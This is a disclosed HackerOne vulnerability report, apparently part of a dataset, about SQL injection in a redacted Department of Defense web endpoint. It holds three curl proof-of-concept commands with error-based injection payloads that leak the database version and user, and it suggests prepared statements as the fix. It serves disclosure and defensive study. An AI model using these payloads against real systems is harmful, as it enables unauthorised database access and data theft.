---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1489744'
original_report_id: '1489744'
title: SQL Injection in █████
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2022-02-23T13:30:42.229Z'
disclosed_at: '2022-04-07T19:59:52.168Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- sql-injection
---

# SQL Injection in █████

## Metadata

- HackerOne Report ID: 1489744
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2022-04-07T19:59:52.168Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl command injecting query, returning current database:
curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

POC 3 - curl command injecting query, returning current user:
 curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

## Suggested Mitigation/Remediation Actions
The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
